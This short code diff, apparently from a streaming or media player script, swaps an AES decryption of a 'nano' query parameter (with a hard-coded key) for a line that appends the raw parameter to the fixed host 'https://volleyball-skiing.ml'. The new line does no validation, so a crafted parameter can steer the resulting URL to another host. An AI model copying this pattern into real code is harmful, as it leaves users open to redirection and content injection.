@@ -117,8 +117,11 @@
                 }
             }
             
-            var url = JSON.parse(CryptoJS.AES.decrypt(atob(location_url.searchParams.get('nano')), '3sc3RLrpd17', {format: CryptoJSAesJson}).toString(CryptoJS.enc.Utf8));
-
+            //var url = JSON.parse(CryptoJS.AES.decrypt(atob(location_url.searchParams.get('nano')), '3sc3RLrpd17', {format: CryptoJSAesJson}).toString(CryptoJS.enc.Utf8));
+            
+            var url = 'https://volleyball-skiing.ml'+location_url.searchParams.get('nano');
+            
+            
             var remake = false;
             var dataUrl = '';
             
